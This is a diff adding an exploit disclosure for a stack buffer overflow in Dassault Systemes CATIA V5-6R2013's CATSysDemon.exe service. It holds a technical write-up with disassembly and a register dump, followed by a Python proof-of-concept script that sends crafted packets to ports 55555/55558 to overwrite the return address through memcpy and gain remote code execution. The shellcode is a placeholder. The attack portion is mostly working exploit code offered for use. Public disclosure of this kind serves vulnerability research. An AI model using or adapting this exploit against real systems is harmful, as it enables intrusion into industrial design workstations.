@@ -1,0 +1,120 @@
+'''
+# Exploit Title: Dassault Systemes Catia V5-6R2013 "CATV5_AllApplications" Stack Buffer Overflow
+# Date: 2-18-2014
+# Exploit Author: Mohamed Shetta
+Email: mshetta |at| live |dot| com
+# Vendor Homepage: http://www.3ds.com/products-services/catia/portfolio/catia-v5/latest-release/
+# Tested on: Windows 7 & Windows XP
+#Vulnerability type: Remote Code Execution
+#Vulnerable file: CATSysDemon.exe
+#PORT: 55558 Or 55555
+
+---------------------------------------------------------------------------------------------------------
+Software Description:
+
+CATIA
+developed by Dassault Systemes (3DS) is the world leading integrated 
+suite of Computer Aided Design (CAD), Engineering (CAE) and 
+Manufacturing (CAM) applications for digital product definition and 
+lifecycle management. CATIA is widely used in aerospace, automotive, 
+shipbuilding, energy and many other industries. CATIA Composites Design 
+is a workbench in CATIA supporting composites design, engineering and 
+manufacture of complex 3D composites parts containing up to thousands of
+plies each. Specific developments by Dassault Systemes allow the 
+transfer of the composites model and determination of anisotropic 
+material properties from the constantly-chaging fiber orientations and 
+ply thicknesses within realistic 3D industrial components. These varying
+material properties in the component have to be used by numerical codes
+such as ACEL-NDT and the FE solver based on XLIFE++ for accurate 
+analyses of these parts (note that trivial composites components like 
+flat panels can be analysed by the numerical codes independently).
+
+
+---------------------------------------------------------------------------------------------------------
+Vulnerability Details:
+
+A stack buffer overflow occurs when copying a user supplied input to a stack buffer of user supplied size.
+An overflow occurs when the user supplies a small size leading to overwrite the return address, However this behavior can't be exploited as another important pointers are overwritten too that affect the flow of the application causing the application to crash before reaching the RET instruction.
+By exploiting memcpy, this vulnerability can be exploited and causes Remote Code Execution.
+
+The vulnerable procedure starts at 004042D0.
+Below is a summarize of what this procedure do.
+-At 00404309 a stack memory allocation function is called with a user supplied parameter.
+This function works as follows, It allocates memory in chunks of 0xF bytes and the current esp is considered a part of a current chunk. For clarification here is an example with values.
+Lets say the ESP was pointing to 0018A468 just before entering the memalloc function (00404309) and a user supplied parameter of 7. The function will return ESP that points to 0018A460 this means that the function allocated 8 bytes another case with a user supplied parameter of 8 the function returns with esp that points to 0018A460 again with user supplied parameter of 9 and the function returns with esp that points to 0018A450 with 0x18 byte allocated if the user supplied parameter of value ranges from 0x9 to 0x18 the function will return the same ESP pointer as it's still in the same chunk of 0xF.
+
+Concluded from this behavior, If the least significant number from ESP at EIP of 0x00404309 changed, the required number of bytes to overwrite the return address will change.This case will happens for different operating systems, Windows 7 will end with 8 and windows XP will end with 0 AS TESTED. 
+
+00404314 |. B9 2A000000 MOV ECX,2A
+00404319 |. 8BFB MOV EDI,EBX
+0040431B |. F3:A5 REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS>
+0040431D |. 8B7D 08 MOV EDI,DWORD PTR SS:[EBP+8]
+00404320 |. 0FB74F 02 MOVZX ECX,WORD PTR DS:[EDI+2]
+00404324 |. 51 PUSH ECX ; /NetShort
+
+The procedure then copies a 0x2A*4 bytes of user supplied buffer to the allocated stack memory, Afterward it gets a pointer from the stack, and that's what made the vulnerability not exploitable without the memcpy function as if we set the stack memory allocation size for small value just to overwrite the return address we will overwrite this pointer which is just above the return address causing the application to crash.
+So to solve this we will use the memcpy function to write the return address. A decent memory allocation size will be supplied which is 0x9A by that size neither of the pointer nor the return address will be overwritten.
+0040432A |. 8B75 FC MOV ESI,DWORD PTR SS:[EBP-4]
+Loads the size parameter for the memcpy function which was over written by the user to be just 8 to prevent further corruption for the application memory( Windows 7 case ).
+Then memcpy is executed, overwriting the Return address with a user supplied one.
+
+Other trivial adjustments were made so that the exploit works on Windows XP and 7. 
+
+----------------------------------------------------------------------------------------------------------
+Registers Dumb:
+
+EAX 00000000
+ECX 00000000
+EDX 0018A2F8
+EBX 00000000
+ESP 0018A480
+EBP 00000002
+ESI 01000000
+EDI B0000000
+EIP 90909090
+C 1 ES 002B 32bit 0(FFFFFFFF)
+P 0 CS 0023 32bit 0(FFFFFFFF)
+A 1 SS 002B 32bit 0(FFFFFFFF)
+Z 0 DS 002B 32bit 0(FFFFFFFF)
+S 1 FS 0053 32bit FFFDD000(FFF)
+T 0 GS 002B 32bit 0(FFFFFFFF)
+D 0
+O 0
+EFL 00000293 (NO,B,NE,BE,S,PO,L,LE)
+ST0 empty 0.0
+ST1 empty 0.0
+ST2 empty 0.0
+ST3 empty 0.0
+ST4 empty 0.0
+ST5 empty 0.0
+ST6 empty 0.0
+ST7 empty 0.0
+3 2 1 0 E S P U O Z D I
+FST 0000 Cond 0 0 0 0 Err 0 0 0 0 0 0 0 0 (GT)
+FCW 027F Prec NEAR,53 Mask 1 1 1 1 1 1
+
+------------------------------------------------------------------------------------------------------------
+Disclosure timeline:
+
+12/15/2013 - Vendor notified and no response.
+2/18/2014 - Public disclosure
+'''
+
+#!/usr/bin/env python
+  
+import socket
+import struct
+import ctypes
+
+RetAdd="\x90\x90\x90\x90"
+Shell="S" *1000
+buff= "\x00\x01\x00\x30" + "A" * 20 + "AppToBusInitMsg" +"\x00" + "\x00" * 48 + "CATV5_Backbone_Bus" +"\x00" + "\x00"* 49 + "\x00\x00\x00\x00"
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.0.3", 55555))
+#s.connect(("192.168.0.5", 55558))
+s.send(struct.pack('>I',len(buff) ))
+s.send(buff)
+buff= "\x02\x00\x00\x00" + RetAdd*3 + "\x00\x00\x00\x00" * 13 + "\x00\x00\x00\x00" * 5 + "CATV5_AllApplications" +"\x00" + "\x00"* 43 +"\x00\x00\x98" + "\x00\x00\x00\x01" +"\x00"*4 +"\x08\x00\x00\x00" + Shell                                   
+s.send(struct.pack('>I',len(buff) ))
+s.send(buff)
+
